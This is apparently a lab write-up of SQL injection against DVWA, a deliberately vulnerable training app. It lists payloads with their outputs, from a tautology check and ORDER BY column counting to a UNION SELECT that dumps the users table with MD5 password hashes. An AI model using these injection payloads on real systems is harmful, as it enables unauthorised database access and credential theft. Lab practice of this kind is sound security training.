# SQL Attack Payloads

## SQL Injection

### Payload 1: Baseline Vulnerability Check
```
1
```

### Output
```html
ID: 1
First name: admin
Surname: admin
```

### Evidence

**Baseline vulnerability check**
![SQL baseline](/dvwa-attack-defend/screenshots/dvwa-sqli-1.png)

---

### Payload 2: Confirming SQLI Vulnerability
```
1' OR '1'='1
```

### Output 
```html
ID: 1' OR '1'='1
First name: admin
Surname: admin
ID: 1' OR '1'='1
First name: Gordon
Surname: Brown
ID: 1' OR '1'='1
First name: Hack
Surname: Me
ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso
ID: 1' OR '1'='1
First name: Bob
Surname: Smith
```

### Evidence

**SQLI Confirmed**
![SQLI Confirmation](/dvwa-attack-defend/screenshots/dvwa-sqli-2.png)

---

### Payload 3: Determining Column Count

#### Check 1

```bash
1' ORDER BY 1 #
```

#### Output
```html
ID: 1' ORDER BY 1 #
First name: admin
Surname: admin 
```

#### Check 2
```
1' ORDER BY 2 #
```

#### Output
```
ID: 1' ORDER BY 2 #
First name: admin
Surname: admin
```

#### Check 3
```
1' ORDER BY 3 #
```

#### Output
```html
Fatal error: Uncaught mysqli_sql_exception: Unknown column '3' in 'ORDER BY' in /var/www/html/vulnerabilities/sqli/source/low.php:11 Stack trace: #0 /var/www/html/vulnerabilities/sqli/source/low.php(11): mysqli_query(Object(mysqli), 'SELECT first_na...') #1 /var/www/html/vulnerabilities/sqli/index.php(34): require_once('/var/www/html/v...') #2 {main} thrown in /var/www/html/vulnerabilities/sqli/source/low.php on line 11
```

> **This Confirms the query returns two columns.**

### Evidence

**Check 1 Result**
![Check 1](/dvwa-attack-defend/screenshots/dvwa-sqli-3-check-1.png)

**Check 2 Result**
![Check 2](/dvwa-attack-defend/screenshots/dvwa-sqli-3-check-2.png)

**Check 3 Result**
![Check 3](/dvwa-attack-defend/screenshots/dvwa-sqli-3-check-3.png)

---

### Payload 4: Dumping DVWA user table (usernames + MD5 hashes)
```
1' UNION SELECT user,password FROM users-- -
```

### Output
```html
ID: 1' UNION SELECT user,password FROM users-- -
First name: admin
Surname: admin
ID: 1' UNION SELECT user,password FROM users-- -
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
ID: 1' UNION SELECT user,password FROM users-- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03
ID: 1' UNION SELECT user,password FROM users-- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
ID: 1' UNION SELECT user,password FROM users-- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
ID: 1' UNION SELECT user,password FROM users-- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

### Evidence

**Usernames and MD5 hashes**
![DVWA user table](/dvwa-attack-defend/screenshots/dvwa-sqli-4.png)